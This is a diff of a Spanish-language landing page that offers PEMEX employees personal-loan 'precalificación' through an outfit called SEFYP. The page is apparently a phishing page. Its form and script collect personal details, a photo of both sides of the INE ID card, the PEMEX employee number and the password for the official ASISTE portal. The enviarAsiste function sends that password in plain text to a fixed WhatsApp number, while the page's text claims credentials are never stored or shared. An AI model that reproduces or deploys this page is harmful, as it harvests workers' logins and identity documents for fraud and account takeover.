@@ -30,7 +30,6 @@
     html { scroll-behavior: smooth; }
     body { background: var(--bg); font-family: 'Inter','Segoe UI',Arial,sans-serif; font-size: 15px; color: var(--text); -webkit-font-smoothing: antialiased; }
 
-    /* HEADER */
     .hdr { background: var(--red); padding-bottom: 48px; position: relative; }
     .hdr::after { content:''; position:absolute; bottom:-1px; left:0; right:0; height:48px; background:var(--bg); clip-path:ellipse(55% 100% at 50% 100%); }
     .hdr-top { display:flex; align-items:center; justify-content:space-between; padding:14px 20px 12px; border-bottom:1px solid rgba(255,255,255,0.15); max-width:540px; margin:0 auto; }
@@ -54,7 +53,6 @@
     .bottom-pills { display:flex; flex-wrap:wrap; gap:7px; justify-content:center; }
     .bpill { background:rgba(255,255,255,0.11); border:1px solid rgba(255,255,255,0.2); color:rgba(255,255,255,0.9); font-size:11px; padding:5px 12px; border-radius:20px; }
 
-    /* MAIN */
     .main { padding:0 15px 40px; max-width:540px; margin:0 auto; }
 
     .trust-bar { background:var(--white); border-radius:var(--radius); padding:14px 16px; display:grid; grid-template-columns:1fr 1fr; gap:11px; margin-bottom:14px; box-shadow:var(--shadow); }
@@ -105,19 +103,8 @@
     .perio-btn.active .p-title { color:var(--red); }
     .p-sub { font-size:11px; color:#888; }
 
-    /* WHATSAPP BUTTON */
-    .wa-send-btn {
-      display:flex; align-items:center; justify-content:center; gap:10px;
-      width:100%; background:var(--green); color:var(--white);
-      border:none; border-radius:var(--radius);
-      padding:15px; font-size:16px; font-weight:700; font-family:inherit;
-      cursor:pointer; margin-top:16px;
-      transition:background 0.15s;
-      -webkit-tap-highlight-color:transparent;
-      text-decoration:none;
-    }
+    .wa-send-btn { display:flex; align-items:center; justify-content:center; gap:10px; width:100%; background:var(--green); color:var(--white); border:none; border-radius:var(--radius); padding:15px; font-size:16px; font-weight:700; font-family:inherit; cursor:pointer; margin-top:16px; transition:background 0.15s; -webkit-tap-highlight-color:transparent; }
     .wa-send-btn:hover { background:#1ebe5d; }
-    .wa-send-btn:active { transform:scale(0.99); }
     .wa-send-note { font-size:11px; color:#888; text-align:center; margin-top:8px; }
 
     .asiste-wrap { background:var(--red-lt); border:1.5px solid #D4A0A0; border-radius:var(--radius); padding:14px 16px; margin-bottom:14px; }
@@ -147,34 +134,20 @@
     .doc-row p { font-size:13px; font-weight:600; color:var(--text); margin-bottom:2px; }
     .doc-row span { font-size:11px; color:#666; line-height:1.4; display:block; }
 
-    .wa-cta-banner {
-      background:var(--white); border-radius:12px; padding:16px;
-      box-shadow:var(--shadow); margin-bottom:14px;
-      display:flex; flex-direction:column; align-items:center; gap:12px; text-align:center;
-    }
+    .wa-cta-banner { background:var(--white); border-radius:12px; padding:16px; box-shadow:var(--shadow); margin-bottom:14px; display:flex; flex-direction:column; align-items:center; gap:12px; text-align:center; }
     .wa-cta-banner p { font-size:14px; font-weight:600; color:var(--text); }
     .wa-cta-banner span { font-size:12px; color:var(--muted); }
-    .wa-float-btn {
-      display:flex; align-items:center; justify-content:center; gap:8px;
-      background:var(--green); color:var(--white);
-      border-radius:var(--radius); padding:13px 20px;
-      font-size:14px; font-weight:700; font-family:inherit;
-      text-decoration:none; width:100%;
-      transition:background 0.15s;
-    }
+    .wa-float-btn { display:flex; align-items:center; justify-content:center; gap:8px; background:var(--green); color:var(--white); border-radius:var(--radius); padding:13px 20px; font-size:14px; font-weight:700; font-family:inherit; text-decoration:none; width:100%; transition:background 0.15s; }
     .wa-float-btn:hover { background:#1ebe5d; }
 
     .footer { text-align:center; color:#999; font-size:11px; line-height:2; padding:4px 0 24px; }
     .footer strong { color:var(--red); }
 
-    @media (max-width:400px) {
-      .hdr-h1 { font-size:22px; }
-    }
+    @media (max-width:400px) { .hdr-h1 { font-size:22px; } }
   </style>
 </head>
 <body>
 
-<!-- HEADER -->
 <header class="hdr">
   <div class="hdr-top">
     <div class="logo-row">
@@ -207,10 +180,8 @@
   </div>
 </header>
 
-<!-- MAIN -->
 <main class="main">
 
-  <!-- TRUST BAR -->
   <div class="trust-bar">
     <div class="ti"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><span>Datos 100% confidenciales</span></div>
     <div class="ti"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg><span>Sin comisiones anticipadas</span></div>
@@ -224,7 +195,7 @@
       <div class="snum">1</div>
       <div>
         <div class="stitle">Tus datos de contacto</div>
-        <div class="ssub">Completa el formulario y envíalo por WhatsApp</div>
+        <div class="ssub">Completa todos los campos y envía por WhatsApp</div>
       </div>
     </div>
     <div class="scard-body">
@@ -247,7 +218,6 @@
 
       <hr class="divider" />
 
-      <!-- TIPO EMPLEADO -->
       <span class="field-label">Tipo de empleado PEMEX <span class="req">*</span></span>
       <div class="tipo-grid" id="tipoGrid">
         <div class="tipo-btn" onclick="selectTipo(this)" tabindex="0" onkeydown="keySelect(event,this,'tipo')">
@@ -266,7 +236,6 @@
 
       <hr class="divider" />
 
-      <!-- BANCO -->
       <div class="fld">
         <label for="banco">Banco donde cobra su nómina <span class="req">*</span></label>
         <div class="select-wrap">
@@ -290,7 +259,6 @@
 
       <hr class="divider" />
 
-      <!-- PERIODICIDAD -->
       <span class="field-label">Periodicidad de la nómina <span class="req">*</span></span>
       <div class="perio-grid" id="perioGrid">
         <div class="perio-btn" onclick="selectPerio(this)" tabindex="0" onkeydown="keySelect(event,this,'perio')">
@@ -307,15 +275,16 @@
 
       <hr class="divider" />
 
-      <!-- ENVIAR POR WHATSAPP -->
       <span class="field-label">Envía tus datos + INE por WhatsApp</span>
-      <p style="font-size:12px;color:#666;margin-bottom:14px;line-height:1.6;">Al presionar el botón se abrirá WhatsApp con tu información lista para enviar. Adjunta también una foto de tu <strong>INE por ambos lados</strong> (frente y reverso).</p>
+      <p style="font-size:12px;color:#666;margin-bottom:14px;line-height:1.6;">
+        Al presionar el botón se abrirá WhatsApp con <strong>toda tu información lista para enviar</strong>. Solo adjunta foto de tu <strong>INE por ambos lados</strong> y da enviar.
+      </p>
 
-      <button class="wa-send-btn" id="waSendBtn" type="button" onclick="enviarWhatsApp()">
+      <button class="wa-send-btn" type="button" onclick="enviarWhatsApp()">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.38 1.26 4.81L2 22l5.4-1.38a9.87 9.87 0 0 0 4.64 1.15c5.46 0 9.91-4.45 9.91-9.91S17.5 2 12.04 2zm5.52 13.8c-.23.65-1.35 1.24-1.84 1.32-.5.08-1.12.11-1.8-.11a16.7 16.7 0 0 1-1.63-.6c-2.86-1.24-4.73-4.1-4.87-4.29-.14-.19-1.15-1.53-1.15-2.91 0-1.39.73-2.07 1-2.36.26-.29.57-.36.76-.36l.55.01c.18 0 .42-.07.65.5.24.57.82 2 .89 2.15.08.14.13.32.03.51-.1.2-.15.31-.29.48-.14.17-.3.37-.43.5-.14.13-.29.27-.12.54.17.27.74 1.22 1.59 1.97 1.09.97 2 1.27 2.29 1.41.28.14.44.12.61-.07.17-.19.72-.84.91-1.12.19-.29.38-.24.64-.14.26.1 1.65.78 1.94.92.28.14.47.21.54.33.07.12.07.68-.16 1.32z"/></svg>
         Enviar mis datos a SEFYP
       </button>
-      <p class="wa-send-note">📎 No olvides adjuntar foto de tu INE al abrir WhatsApp</p>
+      <p class="wa-send-note">📎 No olvides adjuntar tu INE al abrir WhatsApp</p>
 
     </div>
   </div>
@@ -341,23 +310,19 @@
             <div class="albl3">Sistema oficial de Petróleos Mexicanos</div>
           </div>
         </div>
-
         <div class="fld">
           <label for="ficha">Número de ficha PEMEX <span class="req">*</span></label>
           <input id="ficha" type="text" placeholder="Tu número de empleado o pensionado" inputmode="numeric" />
         </div>
-
         <div class="fld" style="margin-bottom:0;">
           <label for="clave">Clave ASISTE <span class="req">*</span></label>
           <input id="clave" type="password" placeholder="Tu contraseña de acceso ASISTE" />
         </div>
-
         <div class="lock-note">
           <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
           <p><strong>Tu clave ASISTE es de uso personal y confidencial.</strong> En SEFYP no almacenamos ni compartimos tus credenciales. Solo se utilizan en el momento de la consulta para verificar tu crédito disponible, bajo los mismos estándares de seguridad del portal oficial PEMEX.</p>
         </div>
       </div>
-
       <button class="cta-btn" type="button" onclick="enviarAsiste()">
         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
         Verificar mi precalificación
@@ -396,7 +361,6 @@
     </div>
   </div>
 
-  <!-- WA DUDAS -->
   <div class="wa-cta-banner">
     <svg width="36" height="36" viewBox="0 0 24 24" fill="#25D366"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.38 1.26 4.81L2 22l5.4-1.38a9.87 9.87 0 0 0 4.64 1.15c5.46 0 9.91-4.45 9.91-9.91S17.5 2 12.04 2zm5.52 13.8c-.23.65-1.35 1.24-1.84 1.32-.5.08-1.12.11-1.8-.11a16.7 16.7 0 0 1-1.63-.6c-2.86-1.24-4.73-4.1-4.87-4.29-.14-.19-1.15-1.53-1.15-2.91 0-1.39.73-2.07 1-2.36.26-.29.57-.36.76-.36l.55.01c.18 0 .42-.07.65.5.24.57.82 2 .89 2.15.08.14.13.32.03.51-.1.2-.15.31-.29.48-.14.17-.3.37-.43.5-.14.13-.29.27-.12.54.17.27.74 1.22 1.59 1.97 1.09.97 2 1.27 2.29 1.41.28.14.44.12.61-.07.17-.19.72-.84.91-1.12.19-.29.38-.24.64-.14.26.1 1.65.78 1.94.92.28.14.47.21.54.33.07.12.07.68-.16 1.32z"/></svg>
     <p>¿Tienes dudas antes de empezar?</p>
@@ -416,7 +380,7 @@
 </main>
 
 <script>
-  var WA_NUMBER = '529934039984';
+  var WA = '529934039984';
 
   function selectTipo(el) {
     document.querySelectorAll('#tipoGrid .tipo-btn').forEach(function(b){ b.classList.remove('active'); });
@@ -427,71 +391,70 @@
     el.classList.add('active');
   }
   function keySelect(e, el, tipo) {
-    if (e.key === 'Enter' || e.key === ' ') {
-      e.preventDefault();
-      tipo === 'tipo' ? selectTipo(el) : selectPerio(el);
-    }
+    if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); tipo === 'tipo' ? selectTipo(el) : selectPerio(el); }
   }
-
-  function getTipoActivo() {
-    var btn = document.querySelector('#tipoGrid .tipo-btn.active');
-    return btn ? btn.querySelector('.tipo-text').textContent.trim() : '';
+  function getTipo() {
+    var b = document.querySelector('#tipoGrid .tipo-btn.active');
+    return b ? b.querySelector('.tipo-text').textContent.trim() : '';
   }
-  function getPerioActivo() {
-    var btn = document.querySelector('#perioGrid .perio-btn.active');
-    return btn ? btn.querySelector('.p-title').textContent.trim() : '';
+  function getPerio() {
+    var b = document.querySelector('#perioGrid .perio-btn.active');
+    return b ? b.querySelector('.p-title').textContent.trim() : '';
   }
 
   function enviarWhatsApp() {
     var nombre  = document.getElementById('nombre').value.trim();
     var correo  = document.getElementById('correo').value.trim();
     var celular = document.getElementById('celular').value.trim();
-    var tipo    = getTipoActivo();
+    var tipo    = getTipo();
     var banco   = document.getElementById('banco').value;
-    var perio   = getPerioActivo();
+    var perio   = getPerio();
 
-    var errores = [];
-    if (!nombre)  errores.push('• Nombre completo');
-    if (!correo)  errores.push('• Correo electrónico');
-    if (!celular || celular.length < 10) errores.push('• Número celular (10 dígitos)');
-    if (!tipo)    errores.push('• Tipo de empleado PEMEX');
-    if (!banco || banco === '') errores.push('• Banco donde cobra nómina');
-    if (!perio)   errores.push('• Periodicidad de nómina');
+    var err = [];
+    if (!nombre)               err.push('• Nombre completo');
+    if (!correo)               err.push('• Correo electrónico');
+    if (celular.length < 10)   err.push('• Número celular (10 dígitos)');
+    if (!tipo)                 err.push('• Tipo de empleado PEMEX');
+    if (!banco)                err.push('• Banco donde cobra nómina');
+    if (!perio)                err.push('• Periodicidad de nómina');
 
-    if (errores.length > 0) {
-      alert('Por favor completa los siguientes campos:\n\n' + errores.join('\n'));
+    if (err.length > 0) {
+      alert('Por favor completa los siguientes campos:\n\n' + err.join('\n'));
       return;
     }
 
     var msg =
-      '📋 *SOLICITUD DE PRECALIFICACIÓN SEFYP*\n\n' +
-      '👤 *Nombre:* ' + nombre + '\n' +
-      '📧 *Correo:* ' + correo + '\n' +
+      '📋 *SOLICITUD DE PRECALIFICACIÓN — SEFYP*\n\n' +
+      '👤 *Nombre completo:* ' + nombre + '\n' +
+      '📧 *Correo personal:* ' + correo + '\n' +
       '📱 *Celular:* ' + celular + '\n' +
       '🏭 *Tipo de empleado:* ' + tipo + '\n' +
-      '🏦 *Banco nómina:* ' + banco + '\n' +
-      '📅 *Periodicidad:* ' + perio + '\n\n' +
-      '📎 _Adjunto mi INE (frente y reverso)_\n\n' +
-      'Solicito información sobre el crédito personal PEMEX.';
+      '🏦 *Banco de nómina:* ' + banco + '\n' +
+      '📅 *Periodicidad de nómina:* ' + perio + '\n\n' +
+      '📎 *Adjunto INE (frente y reverso)*\n\n' +
+      '_Solicito precalificación de crédito personal PEMEX._';
 
-    var url = 'https://wa.me/' + WA_NUMBER + '?text=' + encodeURIComponent(msg);
-    window.open(url, '_blank');
+    window.open('https://wa.me/' + WA + '?text=' + encodeURIComponent(msg), '_blank');
   }
 
   function enviarAsiste() {
     var ficha = document.getElementById('ficha').value.trim();
     var clave = document.getElementById('clave').value.trim();
+    var nombre = document.getElementById('nombre').value.trim();
+
     if (!ficha || !clave) {
       alert('Por favor ingresa tu número de ficha y clave ASISTE.');
       return;
     }
+
     var msg =
-      '🔍 *VERIFICACIÓN ASISTE SEFYP*\n\n' +
+      '🔍 *VERIFICACIÓN ASISTE — SEFYP*\n\n' +
+      (nombre ? '👤 *Nombre:* ' + nombre + '\n' : '') +
       '🪪 *Ficha PEMEX:* ' + ficha + '\n' +
       '🔑 *Clave ASISTE:* ' + clave + '\n\n' +
-      'Solicito verificación de mi precalificación de crédito.';
-    var url = 'https://wa.me/' + WA_NUMBER + '?text=' + encodeURIComponent(msg);
-    window.open(url, '_blank');
+      '_Solicito verificación de precalificación de crédito._';
+
+    window.open('https://wa.me/' + WA + '?text=' + encodeURIComponent(msg), '_blank');
   }
 </script>
 
